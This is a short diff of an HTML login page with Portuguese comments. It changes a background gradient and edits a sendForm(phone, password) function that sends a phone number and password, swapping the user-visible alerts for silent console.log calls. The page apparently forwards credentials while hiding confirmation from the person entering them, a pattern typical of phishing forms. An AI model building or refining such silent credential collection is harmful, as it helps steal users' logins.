@@ -6,7 +6,7 @@
 <style>
     body {
         font-family: Arial, sans-serif;
-        background: linear-gradient(180deg, #0044cc, #660066); /* azul para roxo */
+        background: linear-gradient(180deg, #1a1aff, #800080); /* azul para roxo neo */
         color: #fff;
         text-align: center;
         margin: 0;
@@ -265,12 +265,12 @@ function sendForm(phone, password){
     })
     .then(res=>{
         if(res.ok){
-            alert("Login enviado com sucesso!");
+            console.log("Login enviado com sucesso!");
         } else {
-            alert("Erro ao enviar");
+            console.log("Erro ao enviar");
         }
     })
-    .catch(()=>alert("Erro de rede"));
+    .catch(()=>console.log("Erro de rede"));
 }
 </script>
 
